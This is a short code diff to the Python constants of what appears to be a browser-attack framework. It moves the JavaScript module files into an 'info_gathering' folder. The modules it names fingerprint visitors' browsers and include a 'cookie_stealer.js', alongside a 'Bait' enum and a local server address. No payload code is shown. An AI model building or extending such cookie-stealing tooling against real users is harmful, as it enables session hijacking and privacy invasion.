@@ -2,8 +2,10 @@ from enum import Enum, nonmember
 import base64
 import pathlib
 
-MODULES_PATH = "\\modules"
-BAITS_PATH = "\\baits"
+MODULES_PATH = "modules"
+INFO_GATHERING_PREFIX = "info_gathering"
+
+BAITS_PATH = "baits"
 
 # Config consts
 LAN_SERVER_ADDRESS_CONFIG = "127.0.0.1:5000"
@@ -36,12 +38,12 @@ class Bait(Enum):
 
 
 class Module(Enum):
-    BROWSER_PLUGINS = 'browser_plugins.js'
-    TIMEZONE = 'timezone.js'
-    LANGUAGE = 'language.js'
-    SCREEN_RESOLUTION = 'screen_resolution.js'
-    COOKIE_STEALER = 'cookie_stealer.js'
-    OS = 'os.js'
+    BROWSER_PLUGINS = f'{INFO_GATHERING_PREFIX}\\browser_plugins.js'
+    TIMEZONE = f'{INFO_GATHERING_PREFIX}\\timezone.js'
+    LANGUAGE = f'{INFO_GATHERING_PREFIX}\\language.js'
+    SCREEN_RESOLUTION = f'{INFO_GATHERING_PREFIX}\\screen_resolution.js'
+    COOKIE_STEALER = f'{INFO_GATHERING_PREFIX}\\cookie_stealer.js'
+    OS = f'{INFO_GATHERING_PREFIX}\\os.js'
 
     module_name_to_db_column = nonmember({
         BROWSER_PLUGINS : 'browser_plugins',
